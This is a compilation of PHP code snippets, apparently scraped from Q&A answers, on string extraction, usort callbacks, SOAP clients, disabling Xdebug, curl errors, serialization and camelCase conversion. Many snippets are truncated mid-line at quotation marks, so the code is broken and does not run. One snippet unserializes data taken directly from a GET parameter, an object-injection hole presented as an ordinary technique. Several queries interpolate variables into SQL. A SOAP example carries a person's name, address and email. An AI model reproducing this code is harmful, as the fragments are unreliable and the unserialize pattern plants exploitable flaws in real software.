function getBetween($string, $start = "", $end = ""){ if (strpos($string, $start)) { $startCharCount = strpos($string, $start) + strlen($start); $firstSubStr = substr($string, $startCharCount, strlen($string)); $endCharCount = strpos($firstSubStr, $end); if ($endCharCount == 0) { $endCharCount = strlen($firstSubStr); } return substr($firstSubStr, 0, $endCharCount); } else { return } }
echo getBetween("a","c","abc"); echo getBetween("h","o","hello"); echo getBetween("a","r","World");
function getInnerSubstring($string,$delim){ $string = explode($delim, $string, 3); return isset($string[1]) ? $string[1] : }
function getInbetweenStrings($start, $end, $str){ $matches = array(); $regex = "/$start([a-zA-Z0-9_]*)$end/"; preg_match_all($regex, $str, $matches); return $matches[1]; }
$str = "C: $str_arr = getInbetweenStrings( print_r($str_arr);
<?php function getBetween($content,$start,$end){ $r = explode($start, $content); if (isset($r[1])){ $r = explode($end, $r[1]); return $r[0]; } return } ?>
<?php $content = "Try to find the guy in the middle with this function!"; $start = "Try to find "; $end = " with this function!"; $output = getBetween($content,$start,$end); echo $output; ?>
$value = "This is a great day to be alive"; $value = strstr($value, "is"); $value = strstr($value, "be", true); echo $value;
function get_string_between($string, $start, $end){ $split_string = explode($end,$string); foreach($split_string as $data) { $str_pos = strpos($data,$start); $last_pos = strlen($data); $capture_len = $last_pos - $str_pos; $return[] = substr($data,$str_pos+1,$capture_len); } return $return; }
function getInnerSubstring($string, $boundstring, $trimit=false) { $res = false; $bstart = strpos($string, $boundstring); if ($bstart >= 0) { $bend = strrpos($string, $boundstring); if ($bend >= 0 && $bend > $bstart) $res = substr($string, $bstart+strlen($boundstring), $bend-$bstart-strlen($boundstring)); } return $trimit ? trim($res) : $res; }
$string = "foo I wanna a cake foo"; $substring = getInnerSubstring($string, "foo"); echo $substring;
$substring = getInnerSubstring($string, "foo", true);
<?php $str = "...server daemon started with pid=6849 (parent=6848)."; $from = "pid="; $to = "("; echo getStringBetween($str,$from,$to); function getStringBetween($str,$from,$to) { $sub = substr($str, strpos($str,$from)+strlen($from),strlen($str)); return substr($sub,0,strpos($sub,$to)); } ?>
function get_string_between ($string, $start, $end, $inclusive = false){ $string = " ".$string; if ($start == "") { $ini = 0; } else { $ini = strpos($string, $start); } if ($end == "") { $len = strlen($string); } else { $len = strpos($string, $end, $ini) - $ini;} if (!$inclusive) { $ini += strlen($start); } else { $len += strlen($end); } return substr($string, $ini, $len); }
function get_string_between ($string, $start, $end, $inclusive = false){ $string = " ".$string; if ($start == "") { $ini = 0; } else { $ini = strpos($string, $start); } if ($end == "") { $len = strlen($string); } else { $len = strpos($string, $end, $ini) - $ini - strlen($start);} if (!$inclusive) { $ini += strlen($start); } else { $len += strlen($end); } return substr($string, $ini, $len); }
$str = "Xdata test HD01 test 1data"; $result = explode( print_r($result); echo $result[1];
function between( $str, $sm, $em ) { $s = strpos( $str, $sm ); if( $s === false ) return false; $s += strlen( $sm ); $e = strpos( $str, $em, $s ); if( $e === false ) return false; return substr( $str, $s, $e - $s ); }
function tag_contents($string, $tag_open, $tag_close){ foreach (explode($tag_open, $string) as $key => $value) { if(strpos($value, $tag_close) !== FALSE){ $result[] = substr($value, 0, strpos($value, $tag_close));; } } return $result; } $string = "i love cute animals, like [animal]cat[/animal], [animal]dog[/animal] and [animal]panda[/animal]!!!"; echo "<pre>"; print_r(tag_contents($string , "[animal]" , "[/animal]")); echo "</pre>"; Array ( [0] => cat [1] => dog [2] => panda )
function getStringBetweenDelimiters($p_string, $p_from, $p_to, $p_multiple=false){ if (strlen($p_string) > 0) { if ($p_multiple) { $result_list = explode($p_to, $p_string); foreach ( $result_list AS $rlkey => $rlrow) { $result_start_pos = strpos($rlrow, $p_from); $result_len = strlen($rlrow) - $result_start_pos; if ($result_start_pos > 0) { $result[] = substr($rlrow, $result_start_pos + strlen($p_from), $result_len); } } } else { $result_start_pos = strpos($p_string, $p_from) + strlen($p_from); $result_length = strpos($p_string, $p_to, $result_start_pos); $result = substr($p_string, $result_start_pos+1, $result_length ); } } else { $result = false; } return $result; }
$result = getStringBetweenDelimiters(" one two three ",
if (count(explode("<TAG>", $input))>1){ $content = explode("</TAG>",explode("<TAG>", $input)[1])[0]; }else{ $content = ""; }
function getdatabetween($string, $start, $end){ $sp = strpos($string, $start)+strlen($start); $ep = strpos($string, $end)-strlen($start); $data = trim(substr($string, $sp, $ep)); return trim($data); } $dt = "Find string between two strings in PHP"; echo getdatabetween($dt,
protected function string_between($string, $start, $end, $inclusive = false) { $fragments = explode($start, $string, 2); if (isset($fragments[1])) { $fragments = explode($end, $fragments[1], 2); if ($inclusive) { return $start.$fragments[0].$end; } else { return $fragments[0]; } } return false; }
<?php // function substr_getbykeys($key1, $key2, $source, $returnkeys, $casematters) { if ($casematters === true) { $start = strpos($source, $key1); $end = strpos($source, $key2); } else { $start = stripos($source, $key1); $end = stripos($source, $key2); } if ($start === false || $end === false) { return false; } if ($start > $end) { $temp = $start; $start = $end; $end = $temp; } if ( $returnkeys === true) { $length = ($end + strlen($key2)) - $start; } else { $start = $start + strlen($key1); $length = $end - $start; } return substr($source, $start, $length); } // function substr_delbykeys($key1, $key2, $source, $returnkeys, $casematters) { if ($casematters === true) { $start = strpos($source, $key1); $end = strpos($source, $key2); } else { $start = stripos($source, $key1); $end = stripos($source, $key2); } if ($start === false || $end === false) { return false; } if ($start > $end) { $temp = $start; $start = $end; $end = $temp; } if ( $returnkeys === true) { $start = $start + strlen($key1); $length = $end - $start; } else { $length = ($end + strlen($key2)) - $start; } return substr_replace($source, } ?>
function get_string_between( $string, $start, $end ){ $string = " " . $string; $start_ini = strpos( $string, $start ); $end = strpos( $string, $end, $start+1 ); if ($start && $end) { return substr( $string, $start_ini + strlen($start), strlen( $string )-( $start_ini + $end ) ); } elseif ( $start && !$end ) { return substr( $string, $start_ini + strlen($start) ); } else { return FALSE; } }
function get_string_between($string, $start, $end){ $string = $ini = mb_strpos($string, $start, 0, if ($ini == 0) return $ini += mb_strlen($start, $len = mb_strpos($string, $end, $ini, return mb_substr($string, $ini, $len, } $fullstring = $parsed = get_string_between($fullstring, echo $parsed;
function getBetween($content,$start,$end){ $r = explode($start, $content); if (isset($r[1])){ $r = explode($end, $r[1]); return $r[0]; } return }
echo get_string_between("Hello my name is bob", "my", ""); private function get_string_between($string, $start, $end){ if($start != $string = $ini = strpos($string, $start); if ($ini == 0) return $ini += strlen($start); } else{ $ini = 0; } if ($end == return substr($string, $ini); } else{ $len = strpos($string, $end, $ini) - $ini; return substr($string, $ini, $len); } }
function grabstring($strSource,$strPre,$strPost,$StartAt) { if(@strpos($strSource,$strPre)===FALSE && $strPre!=""){ return(""); } @$Startpoint=strpos($strSource,$strPre,$StartAt)+strlen($strPre); if($strPost == "") { $EndPoint = strlen($strSource); } else { if(strpos($strSource,$strPost,$Startpoint)===FALSE){ $EndPoint= strlen($strSource); } else { $EndPoint = strpos($strSource,$strPost,$Startpoint); } } if($strPre == "") { $Startpoint = 0; } if($EndPoint - $Startpoint < 1) { return ""; } else { return substr($strSource, $Startpoint, $EndPoint - $Startpoint); }
function strbtwn($s,$start,$end){ $i = strpos($s,$start); $j = strpos($s,$end,$i); return $i===false||$j===false? false: substr(substr($s,$i,$j-$i),strlen($start)); }
function getStrBetween($left, $right, $in) { preg_match( return empty($match[1]) ? NULL : $match[1]; }
<?php if (preg_match( return false; } else { echo "<p>Welcome to PHP</p>"; } ?>
$ git clone https: $ cd devilbox $ cp env-example .env $ vim .env $ docker-compose up
$ php artisan serve --port=8080 or $ php -S localhost:8080 -t public/
function merchantSort($a,$b){ return .... } $array = array(
class ClassName { ... private function merchantSort($a,$b) { return ... } public function doSomeWork() { ... $array = $this->someThingThatReturnAnArray(); usort($array, ... } }
private static function merchantSort($a,$b) { return ... }
$array = $this->someThingThatReturnAnArray(); usort($array, array(
class SimpleClass { function getArray( $a ) { usort( $a, array( $this, return $a; } private function nameSort( $a, $b ) { return strcmp( $a, $b ); } } $a = [ $sc = new SimpleClass(); print_r( $sc->getArray( $a ) );
usort($firstArray, function ($a, $b) { if ($a[ return 0; } return ($a[ });
public static function usortCalledFrom() public static function myFunction()
usort($array,"MyClass::myFunction") usort($array, array("MyClass","myFunction")
$client = new SoapClient("http: var_dump($client->__getFunctions()); var_dump($client->__getTypes());
array( [0] => "FirstFunction Function1(FirstFunction $parameters)", [1] => "SecondFunction Function2(SecondFunction $parameters)", ); array( [0] => struct Contact { id id; name name; } [1] => string "string description" [2] => string "int amount" }
$client = new SoapClient("http: $params = array( "id" => 100, "name" => "John", "description" => "Barrel of Oil", "amount" => 500, ); $response = $client->__soapCall("Function1", array($params));
$params = array( array( "id" => 100, "name" => "John", ), "Barrel of Oil", 500, );
$params = array( "Contact" => array( "id" => 100, "name" => "John", ), "description" => "Barrel of Oil", "amount" => 500, );
<?php class Contact { public function __construct($id, $name) { $this->id = $id; $this->name = $name; } } $client = new SoapClient("http: $contact = new Contact(100, "John"); $params = array( "Contact" => $contact, "description" => "Barrel of Oil", "amount" => 500, ); $response = $client->__soapCall("Function1", array($params)); var_dump($response); ?>
<?php $soapclient = new SoapClient( $params = array( $response = $soapclient->getWeather($params); var_dump($response); $param = array( $response = $soapclient->getCitiesByCountry($param); var_dump($response);
$params = array ( "arg0" => $contactid, "arg1" => $desc, "arg2" => $contactname ); $response = $client->__soapCall(
<soapenv:Envelope xmlns:soapenv="http: xmlns:ns="http: <soapenv:Header/> <soapenv:Body> <ns:createOrder reference="260778"> <identification> <sender>5390a7006cee11e0ae3e0800200c9a66</sender> <hash>831f8c1ad25e1dc89cf2d8f23d2af...fa85155f5c67627</hash> <originator>VITS-STAELENS</originator> </identification> <delivery> <from country="ES" node=””/> <to country="ES" node="0299"/> </delivery> <parcel> <description>Zoethout thee</description> <weight>0.100</weight> <orderNumber>10K24</orderNumber> <orderDate>2012-12-31</orderDate> </parcel> <receiver> <firstName>Gladys</firstName> <surname>Roldan de Moras</surname> <address> <line1>Calle General Oraá 26</line1> <line2>(4º izda)</line2> <postalCode>28006</postalCode> <city>Madrid</city> <country>ES</country> </address> <email>gverbruggen@kiala.com</email> <language>es</language> </receiver> </ns:createOrder> </soapenv:Body> </soapenv:Envelope>
var_dump($client->getFunctions()); var_dump($client->getTypes());
array 0 => string array 0 => string Identification identification; Delivery delivery; Parcel parcel; Receiver receiver; string reference; } 1 => string string sender; string hash; string originator; } 2 => string Node from; Node to; } 3 => string string country; string node; } 4 => string string description; decimal weight; string orderNumber; date orderDate; } 5 => string string firstName; string surname; Address address; string email; string language; } 6 => string string line1; string line2; string postalCode; string city; string country; } 7 => string string trackingNumber; string reference; } 8 => string string code; OrderServiceException faultInfo; string message; }
$client = new SoapClient( $params = array( ), ), ), ), ), ), ) ); $result = $client->createOrder($params); var_dump($result);
$soapClient = new SoapClient( $params = [ $response = $soapClient->__soapCall( $xml = $soapClient->__getLastRequest();
struct Contact { function Contact ($pid, $pname) { id = $pid; name = $pname; } } $struct = new Contact(100,"John"); $soapstruct = new SoapVar($struct, SOAP_ENC_OBJECT, "Contact","http: $ContactParam = new SoapParam($soapstruct, "Contact") $response = $client->Function1($ContactParam);
<?php $wsdl = "http: $int_zona = 5; $int_peso = 1001; $cliente = new SoapClient($wsdl); print "<p>Envio Internacional: "; $vem = $cliente->__call( print $vem; print "</p>"; ?>
class Contract { public $id; public $name; } $contract = new Contract(); $contract->id = 100; $contract->name = "John"; $params = array( "Contact" => $contract, "description" => "Barrel of Oil", "amount" => 500, );
$params = array( $contract, "description" => "Barrel of Oil", "amount" => 500, );
$response = $client->__soapCall("Function1", array("FirstFunction" => $params));
$response = $client->__soapCall("Function1", $params);
$params = array( array( "id" => 100, "name" => "John", ), "Barrel of Oil", 500 );
require_once $wsdlLocation = $wsdlInterpreter = new WSDLInterpreter($wsdlLocation); $wsdlInterpreter->savePHP(
$args = array(); $args[ ); $args[ $response = $this->client->__soapCall($name, array(array(
$items = array( if(!empty($items)) { foreach($items as $item) { print $item; } }
$items = array( if(is_array($items)) { foreach($items as $item) { print $item; } }
foreach (($result ? $result : array()) as $item) echo $item;
function a($a = null) { if(is_null($a)) return array(); if(is_array($a)) return $a; if(is_object($a)) return (array) $a; return $_ = func_get_args(); }
foreach(a($whatever) as $item).... $foo = array_map(a($array_or_string).... etc
foreach (is_array($Items) || is_object($Items) ? $Items : array() as $Item) {
if(is_array($items) && count($items) > 0) { foreach($items as $item) { } }
public function option() { return $this->hasOne( } public function setOptionArrayAttribute($values) { $this->option->update($values); }
$model = RepairItem::find($id); if (Input::has( if (<related_model_exists>) { $option = new RepairOption(Input::get( $option->repairItem()->associate($model); $option->save(); $model->fill(Input::except( } else { $model->update(Input::all()); } };
$model->relation; count($model->relation); $model->relation; count($model->relation);
$model->relation; count($model->relation); $model->relation; count($model->relation);
$model->relation()->exists(); $model->relation()->count();
$model = RepairItem::find($id); if (!empty($temp = $request->input( $option = $model->option; if(empty($option)){ $option = $user->expertise()->create(); } $option->someAttribute = temp; $option->save(); };
$model = RepairItem::find($id); $model->option() ->updateOrCreate([
php-yaml 1.3.0 2016-09-24 YAML 1.1 [PHP 5] php-yaml 2.0.0 2016-09-24 YAML 1.1 [PHP 7] syck 0.9.3 2008-11-18 YAML 1.0 sfYaml 3.3.5 2017-06-15 YAML 1.1, most of 1.2 spyc 0.6.2 2017-02-24 YAML 1.1
require_once "spyc.php"; $data = Spyc::YAMLLoad($myfile);
<?php $a= array( print_r($a); echo ("<br></br>"); $b=serialize($a); print_r($b); ?>
Array ( [1] => elem 1 [2] => elem 2 [3] => elem 3 ) a:3:{i:1;s:6:"elem 1";i:2;s:6:"elem 2";i:3;s:7:" elem 3";}
Array ( [1] => elem 1 [2] => elem 2 [3] => elem 3 )
a:3:{i:1;s:6:"elem 1";i:2;s:6:"elem 2";i:3;s:7:" elem 3";}
<array> <element key= <element key= <element key= </array>
echo $multidimentional_array= array( array( array("rose", 1.25, 15), array("daisy", 0.75, 25), array("orchid", 4, 7) ), array( array("rose", 1.25, 15), array("daisy", 0.75, 25), array("orchid", 5, 7) ), array( array("rose", 1.25, 15), array("daisy", 0.75, 25), array("orchid", 8, 7) ) ); $serialized_array=serialize($multidimentional_array); print_r($serialized_array);
a:3:{i:0;a:3:{i:0;a:3:{i:0;s:4:"rose";i:1;d:1.25;i:2;i:15;}i:1;a:3:{i:0;s:5:"daisy";i:1;d:0.75;i:2;i:25;}i:2;a:3:{i:0;s:6:"orchid";i:1;i:4;i:2;i:7;}}i:1;a:3:{i:0;a:3:{i:0;s:4:"rose";i:1;d:1.25;i:2;i:15;}i:1;a:3:{i:0;s:5:"daisy";i:1;d:0.75;i:2;i:25;}i:2;a:3:{i:0;s:6:"orchid";i:1;i:5;i:2;i:7;}}i:2;a:3:{i:0;a:3:{i:0;s:4:"rose";i:1;d:1.25;i:2;i:15;}i:1;a:3:{i:0;s:5:"daisy";i:1;d:0.75;i:2;i:25;}i:2;a:3:{i:0;s:6:"orchid";i:1;i:8;i:2;i:7;}}}
$original_array=unserialize($serialized_array); var_export($original_array);
<?php $a= array("1","2","3"); print_r($a); $b=serialize($a); echo $b; $c=unserialize($b); print_r($c);
$posts = base64_encode(serialize($_POST)); header("Location: $_SERVER[REQUEST_URI]?x=$posts");
if($_GET[ $_POST = unserialize(base64_decode($_GET[ }
**Explain:**Create a table named history which stores all changes. Each time there is a change insert a new row in this table. It might have this fields: history(id,target_table(name of the table), target_id (ID of the saved entry),create/edit/change data (serialized data of the saved row),date)
./phuml -r /var/www/my_project -graphviz -createAssociations false -neato out.png
fdp -Tpdf -Gmaxiter=1000 -Gmindist=0.5 -Gpackmode=node \ -Eweight=0.05 -Elen=1.0 -Eminlen=1.0 -Gsplines=true \ -Goverlap=false xmi-model.dot -oxmi-model.pdf
{%if ability.id in company_abilities%} <tr class="selected"> {%else%} <tr> {%endif%}
<tr class="<?=in_array($ability->id, $company_abilities) ?
\HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\TCPIP6\Parameters
<html> <head> <script> setTimeout(function(){ window.location.reload(1); }, 2000); </script> </head> <body> <iframe name="iframe" id="iframe" src="http: </body> </html>
;zend_extension = "\xampp\php\ext\php_xdebug-2.1.0-5.3-vc6.dll"
[XDebug] zend_extension = C:\xampp\php\ext\php_xdebug-2.3.2-5.6-vc11.dll
Avira >> Real-Time Protection >> Configuration >> Exception >>
; [xdebug] ; zend_extension ="C:/wamp64/bin/php/php5.6.25/zend_ext/php_xdebug-2.4.1-5.6-vc11-x86_64.dll" ; xdebug.remote_enable = off ; xdebug.profiler_enable = off ; xdebug.profiler_enable_trigger = off ; xdebug.profiler_output_name = cachegrind.out.%t.%p ; xdebug.profiler_output_dir ="C:/wamp64/tmp" ; xdebug.show_local_vars=0
netsh winsock reset netsh int ip reset C:\resetlog.txt
; [xdebug] ; zend_extension ="C:/wamp64/bin/php/php5.6.25/zend_ext/php_xdebug-2.4.1-5.6-vc11-x86_64.dll" ; xdebug.remote_enable = off ; xdebug.profiler_enable = off ; xdebug.profiler_enable_trigger = off ; xdebug.profiler_output_name = cachegrind.out.%t.%p ; xdebug.profiler_output_dir ="C:/wamp64/tmp" ; xdebug.show_local_vars=0
edit mysql file under the [wampmysqld] add the following: bind-address = ::
The solution that worked for me was to disable the cgi_module. Use one of these methods: (Method 1) Right click on WAMP > Apache > Apache Modules > uncheck "cgi_module" (Method 2) Edit httpd.conf and disable the loading of the CGI module by commenting this line: LoadModule cgi_module modules/mod_cgi.so Commenting would be just adding a Restart the Apache service and you should be good to go.
LoadModule php5_module "c:/php/php5apache2.dll" AddType application/x-httpd-php .php PHPIniDir "C:/php"
LoadFile "C:/www/php5/php5ts.dll" LoadModule php5_module "C:/www/php5/php5apache2.dll" <IfModule php5_module> <Location /> AddType text/html .php .phps AddHandler application/x-httpd-php .php AddHandler application/x-httpd-php-source .phps </Location> </IfModule>
EnableMMAP on EnableSendfile on AcceptFilter http none AcceptFilter https none HostnameLookups Off
sudo php5dismod xdebug sudo service apache2 restart
define( define( define( $s = file_get_contents(PATH_TO_PHP_INI); $replaced = preg_replace( $isOn = $replaced != $s; if (!$isOn) { $replaced = preg_replace( } echo file_put_contents(PATH_TO_PHP_INI, $replaced); passthru(PATH_TO_HTTPD .
$ mv /etc/php/7.0/fpm/conf.d/20-xdebug.ini /etc/php/7.0/fpm/conf.d/20-xdebug.i $ sudo service php7.0-fpm restart && sudo service nginx restart
; XDEBUG Extension ;zend_extension = "X:/wamp/bin/php/php5.x.xx/zend_ext/php_xdebug-xxxxxx.dll"
xdebug.remote_autostart=0 xdebug.remote_enable=0 xdebug.profiler_enable=0
sudo mv /etc/php.d/xdebug.ini /etc/php.d/xdebug.ini.old sudo service httpd restart
sudo mv /etc/php/7.0/cli/conf.d/20-xdebug.ini /etc/php/7.0/cli/conf.d/20-xdebug.ini.old sudo service nginx restart
sudo phpdismod xdebug sudo service php7.0-fpm restart
sudo service apache2 restart sudo apache2ctl restart
; jch ~ Sweet analizer at https: ; jch ~ When upgrading php versions check if newer xdebug.dll is needed in ext directory. ; jch Renamed... zend_extension = E:\x64Stack\PHP\php7.2.4\ext\php_xdebug-2.6.0-7.2-vc15-x86_64.dll zend_extension = E:\x64Stack\PHP\php7.2.4\ext\php_xdebug.dll ; jch !!!! Added the following for Xdebug with PhpStorm [Xdebug] ; zend_extension=<full_path_to_xdebug_extension> ; xdebug.remote_host=<the host where PhpStorm is running (e.g. localhost)> ; xdebug.remote_port=<the port to which Xdebug tries to connect on the host where PhpStorm is running (default 9000)> xdebug.remote_enable=1 xdebug.remote_host=localhost xdebug.remote_port=9000 xdebug.profiler_enable=1 xdebug.profiler_output_dir="E:\x64Stack\Xdebug_profiler_output" xdebug.idekey=PHPSTORM xdebug.remote_autostart=1 ; jch ~~~~~~~~~To turn Xdebug off(disable) uncomment the following 3 lines restart Apache~~~~~~~~~ ;xdebug.remote_autostart=0 ;xdebug.remote_enable=0 ;xdebug.profiler_enable=0 ; !!! Might get a little more speed by also commenting out this line above... ;;; zend_extension = E:\x64Stack\PHP\php7.2.4\ext\php_xdebug.dll ; so that Xdebug is both disabled AND not loaded
$client = new GuzzleHttp\Client(); $res = $client->get( echo $res->getStatusCode(); echo $res->getBody();
use GuzzleHttp\Client; class yourController extends Controller { public function saveApiData() { $client = new Client(); $res = $client->request( ] ]); echo $res->getStatusCode(); echo $res->getHeader( echo $res->getBody(); }
<button type="submit" id="liquidacion_save" name="liquidacion[save]" onclick="$( <button type="submit" id="liquidacion_Previsualizar" name="liquidacion[Previsualizar]" onclick="$(
<form> <input type="submit" formtarget="_blank"/> </form>
<script type="text/javascript"> $("form").submit(function() { $("form").attr( return true; }); </script>
<form target="_blank"> <a href=" </form> <script> $( $( }); </script>
Array ( [0] => Array ( [id] => 0 [name] => name1 [short_name] => n1 ) [2] => Array ( [id] => 2 [name] => name2 [short_name] => n2 ) )
[ { "id":0, "name":"name1", "short_name":"n1" }, { "id":2, "name":"name2", "short_name":"n2" } ]
{ "0":{ "id":0, "name":"name1", "short_name":"n1" }, "2":{ "id":2, "name":"name2", "short_name":"n2" } }
$indexedOnly = array(); foreach ($associative as $row) { $indexedOnly[] = array_values($row); } json_encode($indexedOnly);
<?php $arr1=array( $arr2=array( $arr3=array($arr1,$arr2); print (json_encode($arr3)); ?>
$c = curl_init(); curl_setopt($c, CURLOPT_URL, $url); curl_setopt($c, CURLOPT_RETURNTRANSFER, true); curl_setopt($c, CURLOPT_POST, true); curl_setopt($c, CURLOPT_POSTFIELDS, $data); $result = curl_exec($c); if (curl_exec($c) === false) { echo "ok"; } else { echo "error"; } curl_close($c);
$ch = curl_init(); curl_setopt($ch, CURLOPT_URL, $your_url); curl_setopt($ch, CURLOPT_FAILONERROR, true); curl_exec($ch); if (curl_error($ch)) { $error_msg = curl_error($ch); } curl_close($ch); if (isset($error_msg)) { }
<?php if (@$_GET[ header( } else { $ch=curl_init($url = "http: curl_setopt($ch, CURLOPT_FAILONERROR, true); $response=curl_exec($ch); $http_status = curl_getinfo($ch, CURLINFO_HTTP_CODE); $curl_errno= curl_errno($ch); if ($http_status==503) echo "HTTP Status == 503 <br/>"; echo "Curl Errno returned $curl_errno <br/>"; }
$url = $ch = curl_init($url); curl_setopt($ch, CURLOPT_RETURNTRANSFER, true); $result = curl_exec($ch); if(curl_errno($ch)){ echo }
<?php $error_codes=array( [1] => [2] => [3] => [4] => [5] => [6] => [7] => [8] => [9] => [11] => [13] => [14]=> [15] => [17] => [18] => [19] => [21] => [22] => [23] => [25] => [26] => [27] => [28] => [30] => [31] => [33] => [34] => [35] => [36] => [37] => [38] => [39] => [41] => [42] => [43] => [45] => [47] => [48] => [49] => [51] => [52] => [53] => [54] => [55] => [56] => [58] => [59] => [60] => [61] => [62] => [63] => [64] => [65] => [66] => [67] => [68] => [69] => [70] => [71] => [72] => [73] => [74] => [75] => [76] => [77] => [78] => [79] => [80] => [81] => [82] => [83] => [84] => [84] => [85] => [86] => [87] => [88] => ?>
function curl_error_test($url) { $ch = curl_init(); curl_setopt($ch, CURLOPT_URL, $url); curl_setopt($ch, CURLOPT_RETURNTRANSFER, true); $responseBody = curl_exec($ch); /* * if curl_exec failed then * $responseBody is false * curl_errno() returns non-zero number * curl_error() returns non-empty string * which one to use is up too you */ if ($responseBody === false) { return "CURL Error: " . curl_error($ch); } $responseCode = curl_getinfo($ch, CURLINFO_HTTP_CODE); /* * 4xx status codes are client errors * 5xx status codes are server errors */ if ($responseCode >= 400) { return "HTTP Error: " . $responseCode; } return "No CURL or HTTP Error"; }
curl_error_test("http: curl_error_test("http: curl_error_test("http:
$responseInfo = curl_getinfo($ch); $httpCode = curl_getinfo($ch, CURLINFO_HTTP_CODE); $header_size = curl_getinfo($ch, CURLINFO_HEADER_SIZE); $body = substr($response, $header_size); $result=array(); $result[ $result[ $result[ print_r($httpCode); print_r($result[ curl_close($ch); if($httpCode == 403) { print_r("Access denied"); exit; } else { }
<input name="xyz[]" value="Lorem" /> <input name="xyz[]" value="ipsum" /> <input name="xyz[]" value="dolor" /> <input name="xyz[]" value="sit" /> <input name="xyz[]" value="amet" />
... [OPcache] zend_extension=php_opcache.dll opcache.enable=1 opcache.enable_cli=1 opcache.memory_consumption=512 opcache.interned_strings_buffer=24 opcache.max_accelerated_files=4000 opcache.revalidate_freq=3 opcache.fast_shutdown=1 ...
... [XDebug] zend_extension = "C:\Program Files (x86)\Ampps\php\ext\php_xdebug-2.2.6-5.5-vc11.dll" ......
[OPcache] zend_extension = php_opcache.dll opcache.enable=1 opcache.enable_cli=1 opcache.memory_consumption=512 opcache.interned_strings_buffer=24 opcache.max_accelerated_files=4000 opcache.revalidate_freq=3 opcache.fast_shutdown=1 [XDebug] zend_extension = "C:\xampp\php\ext\php_xdebug.dll" xdebug.max_nesting_level = 200 xdebug.profiler_append = 1 xdebug.profiler_enable = 1 xdebug.profiler_enable_trigger = 0 ;xdebug.profiler_output_dir = "C:\xampp\tmp" ;xdebug.profiler_output_name = "cachegrind.out.%t-%s" ;xdebug.remote_enable = 0 ;xdebug.remote_handler = "dbgp" ;xdebug.remote_host = "127.0.0.1" ;xdebug.trace_output_dir = "C:\xampp\tmp"
include_once( $page=isset($_REQUEST[ $id=isset($_REQUEST[ ... if(!$id){ if($page){ $r=Page::getInstanceByName($page); if($r && isset($r->id))$id=$r->id; } if(!$id){ $special=1; if(!$page){ $r=Page::getInstanceBySpecial($special); if($r && isset($r->id))$id=$r->id; } } } if($id){ $PAGEDATA=(isset($r) && $r)?$r : Page::getInstance($id); } else{ echo exit; } ... ...
session_start(); if(!function_exists( function __autoload($name) { require $name . } } ... ...
class Page{ static $instances = array(); static $instancesByName = array(); static $instancesBySpecial = array(); function __construct($v,$byField=0,$fromRow=0,$pvq=0){ if (!$byField && is_numeric($v)){ $r=$fromRow?$fromRow:($v?dbRow("select * from pages where id=$v limit 1"):array()); } else if ($byField == 1){ $name=strtolower(str_replace( $fname= $r=dbRow("select * from pages where name like } else if ($byField == 3 && is_numeric($v)){ $fname= $r=dbRow("select * from pages where special&$v limit 1"); } else return false; if(!count($r || !is_array($r)))return false; if(!isset($r[ if(!isset($r[ if(!isset($r[ if(!isset($r[ foreach ($r as $k=>$v) $this->{$k}=$v; $this->urlname=$r[ $this->dbVals=$r; self::$instances[$this->id] =& $this; self::$instancesByName[preg_replace( self::$instancesBySpecial[$this->special] =& $this; if(!$this->vars)$this->vars= $this->vars=json_decode($this->vars); } function getInstance($id=0,$fromRow=false,$pvq=false){ if (!is_numeric($id)) return false; if (!@array_key_exists($id,self::$instances)) self::$instances[$id]=new Page($id,0,$fromRow,$pvq); return self::$instances[$id]; } function getInstanceByName($name= $name=strtolower($name); $nameIndex=preg_replace( if(@array_key_exists($nameIndex,self::$instancesByName))return self::$instancesByName[$nameIndex]; self::$instancesByName[$nameIndex]=new Page($name,1); return self::$instancesByName[$nameIndex]; } function getInstanceBySpecial($sp=0){ if (!is_numeric($sp)) return false; if (!@array_key_exists($sp,$instancesBySpecial)) $instancesBySpecial[$sp]=new Page($sp,3); return $instancesBySpecial[$sp]; }
class Foo { public static $static_var = static function staticValue() { return function Value() { return } echo Foo::$static_var . "<br/>"; echo Foo::staticValue(). "<br/>"; $foo = new Foo(); echo $foo->Value();
608E-4234 == 272E-3063 608E-4234 == "272E-3063" "608E-4234" == 272E-3063 "608E-4234" == "272E-3063"
Name Common name Base Digits E min E max binary32 Single precision 2 23+1 −126 +127 binary64 Double precision 2 52+1 −1022 +1023
$tests = array( ); foreach ($tests as $test => $result) { $output = from_camel_case($test); if ($output === $result) { echo "Pass: $test => $result\n"; } else { echo "Fail: $test => $result [$output]\n"; } } function from_camel_case($input) { preg_match_all( $ret = $matches[0]; foreach ($ret as &$match) { $match = $match == strtoupper($match) ? strtolower($match) : lcfirst($match); } return implode( }
Pass: simpleTest => simple_test Pass: easy => easy Pass: HTML => html Pass: simpleXML => simple_xml Pass: PDFLoad => pdf_load Pass: startMIDDLELast => start_middle_last Pass: AString => a_string Pass: Some4Numbers234 => some4_numbers234 Pass: TEST123String => test123_string
function decamelize($string) { return strtolower(preg_replace([ }
simpleTest => simple_test easy => easy HTML => html simpleXML => simple_xml PDFLoad => pdf_load startMIDDLELast => start_middle_last AString => a_string Some4Numbers234 => some4_numbers234 TEST123String => test123_string hello_world => hello_world hello__world => hello__world _hello_world_ => _hello_world_ hello_World => hello_world HelloWorld => hello_world helloWorldFoo => hello_world_foo hello-world => hello-world myHTMLFiLe => my_html_fi_le aBaBaB => a_ba_ba_b BaBaBa => ba_ba_ba libC => lib_c
function decamelize($word) { return preg_replace( $word ); } function camelize($word) { return preg_replace( }
$underscored = strtolower( preg_replace( ["/([A-Z]+)/", "/_([A-Z]+)([A-Z][a-z])/"], ["_$1", "_$1_$2"], lcfirst($camelCase) ) );
$nameConverter = new CamelCaseToSnakeCaseNameConverter(); echo $nameConverter->normalize( echo $nameConverter->denormalize(
function uncamelize($camel,$splitter="_") { $camel=preg_replace( return strtolower($camel); }
$camelized="thisStringIsCamelized"; echo uncamelize($camelized,"_"); echo uncamelize($camelized,"-");
header( $separated = preg_replace( $lower = mb_strtolower($separated, echo $lower;
function uncamelize($str) { $str = lcfirst($str); $lc = strtolower($str); $result = $length = strlen($str); for ($i = 0; $i < $length; $i++) { $result .= ($str[$i] == $lc[$i] ? } return $result; } echo uncamelize(
function decamelize($word) { return $word = preg_replace_callback( "/(^|[a-z])([A-Z])/", function($m) { return strtolower(strlen($m[1]) ? "$m[1]_$m[2]" : "$m[2]"); }, $word ); } function camelize($word) { return $word = preg_replace_callback( "/(^|_)([a-z])/", function($m) { return strtoupper("$m[2]"); }, $word ); }
function camelToSnake($camel) { $snake = preg_replace( $snake = strtolower($snake); $snake = ltrim($snake, return $snake; }
